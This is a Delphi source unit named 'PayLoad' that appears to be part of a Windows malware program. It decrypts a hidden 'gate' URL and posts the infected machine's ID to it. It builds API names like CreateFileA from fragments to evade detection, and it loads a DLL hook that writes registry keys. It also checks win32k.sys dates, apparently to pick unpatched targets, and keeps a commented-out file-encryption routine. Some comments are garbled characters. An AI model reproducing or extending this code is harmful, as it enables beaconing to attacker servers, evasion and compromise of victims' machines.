unit PayLoad;

interface

  function SetXMLConfig(const AFileName, AID: string): Boolean;
  function SendID(const MachineID: string): Boolean;
  function IsSystemOk: Boolean;
  function GateUrl: string;
  function LoadHookLib(const ALibName, AProcName, ARegPath, AKeyName, AKeyValue: string): Boolean;
  function CheckWin32kSysDate: Boolean;
  procedure MakeInternalKeys;
  //function CryptFile(const AFileName, AKey: string): Boolean;

implementation

uses
  Windows, Classes, SysUtils, GlobalVar, Patterns, Crypto, XmlWrk, HttpWrk, RxStrUtils, RegWrk,
  {DCPblowfish, DCPsha1,} httpsend;

{++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++}
function LoadHookLib(const ALibName, AProcName, ARegPath, AKeyName, AKeyValue: string): Boolean;
var
  hLib: THandle;
  hookproc: procedure(RegPath, KeyName, KeyValue: PChar); stdcall;
begin
  Result := False;;
  hLib := LoadLibrary(PChar(ALibName));
  if hLib <> 0 then
    begin
      @hookproc := GetProcAddress(hLib, PChar(AProcName));
      if Assigned(hookproc) then
        begin
          hookproc(PChar(ARegPath), PChar(AKeyName), PChar(AnsiQuotedStr(AKeyValue, '"')));
          Result := True;
        end;
    end;
end;

{++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++}
function IsSystemOk: Boolean;
begin
   //Result := (GetUserDefaultLCID = 1049);
   // ������ ������ �� ���������
   Result := True;
end;
{++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++}
function SetXMLConfig(const AFileName, AID: string): Boolean;
var
  ParamList: TStringList;
  //ProxyServer: string;
begin
  Result := False;

  ParamList := TStringList.Create;
  with ParamList do
  try
    try
      Delimiter := '=';
      Add(DecStr(XML_AUTOCONNECT));
      Add(DecStr(XML_NOIP_ID) + AID);

//      if SameText(ParamStr(1), '-r') then
//         Result := SetSubXMLParameters(AFileName, DecStr(XML_NOIP_SETTINGS), ParamList,
//                                       HKEY_LOCAL_MACHINE, DecStr(ID_REG_LM))
//      else
      Result := SetSubXMLParameters(AFileName, DecStr(XML_NOIP_SETTINGS), ParamList);

      // ������������ wininet proxy?
//      ProxyServer := GetProxyServer;
//      if ProxyServer <> '' then
//         Result := Result and
//                   SetSubXMLParameters2(AFileName, DecStr(XML_OPTIONS), ProxyServer);

      // ������ � ������?
      if SameText(ParamStr(1), '-r') then
         Result := Result and XML2Registry(AFileName, HKEY_LOCAL_MACHINE, DecStr(ID_REG_LM));
    except
      //
    end;
  finally
    ParamList.Free;
  end;
end;

{++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++}
function GateUrl: string;
var
  S: string;
  Idx: Integer;
begin
  Result := '';

  S := Decrypt(HTTP_GATE_URL_1, gK1, gK2, gK3);
  Idx := Pos(#0#0#0#0, S);
  if Idx > 0 then
     Result := Copy(S, 1, Idx - 1);
end;

{++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++}
function SendID(const MachineID: string): Boolean;
var
  {S, }Url, UrlData: string;
begin
  Result := False;

  Url := GateUrl;
  if Trim(Url) = '*' then
     Exit;

  UrlData := DecStr(SRV_ID_PAT) + MachineID;

  //if DecryptProc(@THTTPSend.HTTPMethod, $FF8) then
  //Url := 'http://95.154.110.154/ipn/test_post2.php';
  // S := '?data=' +'12345' + #10#15+'tst'+'&test=qwerty';
  //Http_PostURL(Url, S);

  //if DecryptProc(@ParseURL, $1F8) then
//  if DecryptProc(@ParseURL, $1C4) then
  //HttpPostURLThread(Url, UrlData);

   Http_PostURL(Url, UrlData);
   //Http_PostURL2(Url, UrlData, nil);
end;

{++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++}
procedure MakeInternalKeys;
begin
  iK1 := 0; iK2 := 0; iK3 := 0;

  // 2539
  iK1 := 5075;
  iK1 := Trunc(iK1/2) + 2;

  // 712531
  iK2 := 712;
  iK2 := iK2*1000;
  iK2 := iK2 + 530;
  Inc(iK2);

  // 825173
  iK3 := 825;
  iK3 := iK3*1000;
  iK3 := iK3 + 170;
  iK3 := iK3 + Trunc(pi);
end;

{++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++}
//function CryptFile(const AFileName, AKey: string): Boolean;
//var
//  Source: TFileStream;
//  Dest: TMemoryStream;
//  Cipher: TDCP_blowfish;
//begin
//  Result := False;
//  Cipher := TDCP_blowfish.Create(nil);
//  Source := TFileStream.Create(AFileName, fmOpenReadWrite);
//  Dest   := TMemoryStream.Create;
//  try
//    try
//      Cipher.InitStr(AKey, TDCP_sha1);
//      Cipher.EncryptStream(Source, Dest, Source.Size);
//      Source.Free;
//
//      Dest.Position := 0;
//      Dest.SaveToFile(AFileName);
//      Dest.Free;
//      Result := True;
//    except
//      //
//    end;
//  finally
//    Cipher.Burn;
//    Cipher.Free;
//    //Source.Free;
//  end;
//end;

{++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++}
function SystemDir: string;
var
  dir: array [0..MAX_PATH] of Char;
  sFuncName: string;
  hMod: HMODULE;
  pGetSystemDirectory: function(lpBuffer: PAnsiChar; uSize: UINT): UINT; stdcall;
begin
  Result := '';

  hMod := GetModuleHandle(PChar('kernel32.dll'));
  if hMod <> 0 then
    begin
      sFuncName := 'GetSy';
      sFuncName := sFuncName + 'stemD';
      sFuncName := sFuncName + 'irec';
      sFuncName := sFuncName + 'toryA';

      @pGetSystemDirectory := GetProcAddress(hMod, PChar(sFuncName));
      if Assigned(pGetSystemDirectory) then
        begin
          pGetSystemDirectory(dir, MAX_PATH);
          Result := StrPas(dir);
        end;
    end;

//  ������    
//  GetSystemDirectory(dir, MAX_PATH);
//  Result := StrPas(dir);
end;

{++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++}
function GetWinDir: string;
var
  dir: array [0..MAX_PATH] of Char;
  sFuncName: string;
  hMod: HMODULE;
  pGetWindowsDirectory: function(lpBuffer: PAnsiChar; uSize: UINT): UINT; stdcall;
begin
  Result := '';

  hMod := GetModuleHandle(PChar('kernel32.dll'));
  if hMod <> 0 then
    begin
      sFuncName := 'GetWi';
      sFuncName := sFuncName + 'ndowsD';
      sFuncName := sFuncName + 'irec';
      sFuncName := sFuncName + 'toryA';

      @pGetWindowsDirectory := GetProcAddress(hMod, PChar(sFuncName));
      if Assigned(pGetWindowsDirectory) then
        begin
          pGetWindowsDirectory(dir, MAX_PATH);
          Result := StrPas(dir);
        end;
    end;

//  ������
//  GetWindowsDirectory(dir, MAX_PATH);
//  Result := StrPas(dir);
end;

type
  WinIsWow64 = function( Handle: THandle; var Iret: BOOL ): Windows.BOOL; stdcall;

function IAmIn64Bits: Boolean;
var
  HandleTo64BitsProcess: WinIsWow64;
  Iret                 : Windows.BOOL;
begin
  Result := False;
  HandleTo64BitsProcess := GetProcAddress(GetModuleHandle('kernel32.dll'),
                                          'IsWow64Process');
  if Assigned(HandleTo64BitsProcess) then
  begin
    if not HandleTo64BitsProcess(GetCurrentProcess, Iret) then
    raise Exception.Create('Invalid handle');
    Result := Iret;
  end;
end;

{++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++}
function DSiFileTimeToDateTime(fileTime: TFileTime; var dateTime: TDateTime): boolean;
var
  sysTime: TSystemTime;
begin
  Result := FileTimeToSystemTime(fileTime, sysTime);
  if Result then
    dateTime := SystemTimeToDateTime(sysTime);
end; { DSiFileTimeToDateTime }

function  DSiGetFileTimes(const fileName: string; var creationTime, lastAccessTime,
  lastModificationTime: TDateTime): boolean;
var
  fileHandle            : cardinal;
  fsCreationTime        : TFileTime;
  fsLastAccessTime      : TFileTime;
  fsLastModificationTime: TFileTime;

  sFuncName: string;
  hMod: HMODULE;
  pCreateFileA: function(lpFileName: PAnsiChar; dwDesiredAccess, dwShareMode: DWORD;
    lpSecurityAttributes: PSecurityAttributes; dwCreationDisposition, dwFlagsAndAttributes: DWORD;
    hTemplateFile: THandle): THandle; stdcall;
begin
  Result := False;

//  ������
//  fileHandle := CreateFile(PChar(fileName), STANDARD_RIGHTS_READ{GENERIC_READ}, FILE_SHARE_READ, nil,
//    OPEN_EXISTING, 0, 0);

  fileHandle := INVALID_HANDLE_VALUE;
  hMod := GetModuleHandle(PChar('kernel32.dll'));
  if hMod <> 0 then
    begin
      sFuncName := 'Crea';
      sFuncName := sFuncName + 'teFi';
      sFuncName := sFuncName + 'leA';

      @pCreateFileA := GetProcAddress(hMod, PChar(sFuncName));
      if Assigned(pCreateFileA) then
        begin
          fileHandle := pCreateFileA(PChar(fileName), STANDARD_RIGHTS_READ{GENERIC_READ},
                                     FILE_SHARE_READ, nil, OPEN_EXISTING, 0, 0);
        end;
    end;


  if fileHandle <> INVALID_HANDLE_VALUE then try
    Result :=
      GetFileTime(fileHandle, @fsCreationTime, @fsLastAccessTime,
         @fsLastModificationTime) and
      DSiFileTimeToDateTime(fsCreationTime, creationTime) and
      DSiFileTimeToDateTime(fsLastAccessTime, lastAccessTime) and
      DSiFileTimeToDateTime(fsLastModificationTime, lastModificationTime);
  finally
    CloseHandle(fileHandle);
  end;
end; { DSiGetFileTimes }

{++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++}
function CheckWin32kSysDate: Boolean;
const
  WFILENAME = {#CRYPT 'win32k.sys'}#46#211#224#207#27#227#249#144#184#74#20#4{ENDC};
  SYSNATIVE = {#CRYPT 'Sysnative'}#46#247#137#94#11#243#50#38#143#1#212{ENDC};
var
  win32ksysFilePath: string;
  creationTime, lastAccessTime,
  lastModificationTime,
  checkDate: TDateTime;
begin
  Result := False;

  if not IAmIn64Bits then
     win32ksysFilePath := IncludeTrailingBackSlash(SystemDir)
  else
     win32ksysFilePath := IncludeTrailingBackSlash(GetWinDir) +
                          IncludeTrailingBackSlash(DecStr(SYSNATIVE));
  win32ksysFilePath := win32ksysFilePath + DecStr(WFILENAME);

  if DSiGetFileTimes(win32ksysFilePath, creationTime, lastAccessTime, lastModificationTime) then
    begin
      checkDate := 41462;
      Result := (creationTime < checkDate) and (lastModificationTime < checkDate);
    end;
end;

end.
